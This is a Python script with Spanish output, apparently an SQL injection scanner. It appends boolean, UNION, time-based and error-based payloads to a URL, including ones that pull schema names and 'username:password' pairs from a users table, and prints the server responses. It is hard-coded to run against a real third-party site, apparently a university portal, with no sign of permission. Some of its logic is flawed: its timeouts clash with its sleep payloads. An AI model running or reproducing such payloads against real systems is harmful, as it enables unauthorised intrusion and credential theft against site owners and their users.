import requests

def detect_sql_injection(url):
    payloads = [
        "' OR 1=1 --",
        "' OR 'a'='a",
        "') OR ('a'='a",
        "') OR 1=1 --",
        "') UNION SELECT NULL, user(), version() --",
        "') UNION SELECT NULL, table_name, column_name FROM information_schema.columns --",
        "') UNION SELECT NULL, CONCAT(username, ':', password) FROM users --",
        "' OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns --",
        "' OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema != 'information_schema' --"
    ]
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36"}
    
    for payload in payloads:
        modified_url = url + payload
        response = requests.get(modified_url, headers=headers)
        
        if "error" in response.text.lower() or "syntax" in response.text.lower():
            print("La URL", modified_url, "puede ser vulnerable a SQL Injection.")
            print("---- Detalles de la vulnerabilidad SQL Injection ----")
            print("Payload utilizado: ", payload)
            print("Respuesta del servidor:")
            print(response.text)
            print("-------------------------------------------")
        
        # Detección basada en tiempo
        modified_url = url + "'; WAITFOR DELAY '0:0:5' --"
        response = requests.get(modified_url, headers=headers, timeout=5)
        if response.elapsed.total_seconds() > 4:
            print("La URL", modified_url, "puede ser vulnerable a SQL Injection basada en tiempo.")
            print("-------------------------------------------")
        
        # Detección de error basada en la longitud de la respuesta
        modified_url = url + "' AND 1=2 UNION SELECT NULL, REPEAT('A', 1000000) --"
        response = requests.get(modified_url, headers=headers)
        if len(response.text) > 100000:
            print("La URL", modified_url, "puede ser vulnerable a SQL Injection basada en la longitud de la respuesta.")
            print("-------------------------------------------")
            
        # Detección de comentarios no filtrados
        modified_url = url + "'/*abc*/"
        response = requests.get(modified_url, headers=headers)
        if "abc" in response.text:
            print("La URL", modified_url, "puede ser vulnerable a SQL Injection debido a comentarios no filtrados.")
            print("-------------------------------------------")
        
        # Detección de ceguera de tiempo basada en if/else
        modified_url = url + "' AND IF(1=1, SLEEP(5), 0) --"
        response = requests.get(modified_url, headers=headers, timeout=5)
        if response.elapsed.total_seconds() > 4:
            print("La URL", modified_url, "puede ser vulnerable a SQL Injection basada en ceguera de tiempo.")
            print("-------------------------------------------")
        
        # Detección de errores basada en mensajes de error personalizados
        modified_url = url + "' OR 1/0--"
        response = requests.get(modified_url, headers=headers)
        if "division by zero" in response.text.lower():
            print("La URL", modified_url, "puede ser vulnerable a SQL Injection basada en mensajes de error personalizados.")
            print("-------------------------------------------")

# URL objetivo para probar el script
target_url = "https://guarani.uba.ar/cbc/"

# Llamamos a la función para detectar vulnerabilidades de SQL Injection
detect_sql_injection(target_url)
